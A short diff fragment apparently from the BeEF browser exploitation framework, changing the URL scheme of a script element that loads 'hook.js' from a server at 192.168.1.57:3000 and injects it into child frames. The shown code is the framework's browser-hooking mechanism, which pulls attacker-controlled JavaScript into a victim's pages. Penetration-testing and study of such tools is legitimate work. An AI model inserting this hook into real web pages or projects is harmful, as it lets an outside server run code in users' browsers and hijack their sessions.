@@ -8938,7 +8938,7 @@ beef.browser = {
         // create script object
         var script = document.createElement('script');
         script.type = 'text/javascript';
-        script.src = 'https://192.168.1.57:3000/hook.js';
+        script.src = 'http://192.168.1.57:3000/hook.js';
 
         // loop through child frames
         for (var i = 0; i < self.frames.length; i++) {
